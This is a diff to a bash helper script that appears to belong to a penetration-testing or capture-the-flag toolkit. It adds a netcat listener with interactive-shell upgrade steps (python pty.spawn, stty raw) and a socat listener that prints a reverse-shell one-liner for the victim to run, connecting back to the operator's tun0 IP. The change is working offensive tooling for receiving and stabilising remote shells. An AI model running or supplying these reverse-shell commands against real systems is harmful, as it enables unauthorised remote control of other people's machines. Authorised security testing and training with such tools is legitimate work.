@@ -37,6 +37,9 @@ getIP() {
   fi
 
   IP=$(ip -4 addr show "$DEV" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
+  if [ -z "$IP" ]; then
+    echo "[!] Error getting IP. Stale tun0 device?"; exit
+  fi
   echo "$IP"
 }
 
@@ -201,6 +204,37 @@ if [ "$1" == "l" ] || [ "$1" == "listen" ] ; then
     PORT="9001"
   fi
   CMD="$CMD -vlkp $PORT"
+  # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+  echo "> Shell upgrade instructions:"
+  echo "    python -c 'import pty;pty.spawn(\"/bin/bash\")'"
+  echo "    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+  echo "    Ctrl-z"
+  echo "    stty raw -echo"
+  echo "    fg + [Enter x 2]"
+  # reset?
+  echo "    export SHELL=/bin/bash"
+  echo "    export TERM=$TERM" #export TERM=screen
+  ROWS="$(stty -a | grep -oE "rows [0-9]{1,}" | cut -d' ' -f2)"
+  COLS="$(stty -a | grep -oE "columns [0-9]{1,}" | cut -d' ' -f2)"
+  echo -e "    stty rows $ROWS columns $COLS\n"
+  echo "> $CMD"
+  bash -c "$CMD"
+  exit
+fi
+
+## socat [port]\t\t\t\t: socat based listener
+# https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+if [ "$1" == "socat" ]; then
+  CMD="socat"; checkCmd
+  if [ "$#" -eq 2 ]; then
+    PORT="$2"
+  else
+    PORT="9001"
+  fi
+  CMD="$CMD file:`tty`,raw,echo=0 tcp-listen:$PORT"
+  # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+  echo "> Run this on your target:"
+  echo -e "   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$(getIP):$PORT\n"
   echo "> $CMD"
   bash -c "$CMD"
   exit
@@ -762,6 +796,7 @@ fi
 # smbclient
 # smbmap
 # enum4linux
+# bash one liners
 
 # Nothing found? Invalid command?
 show_help; exit
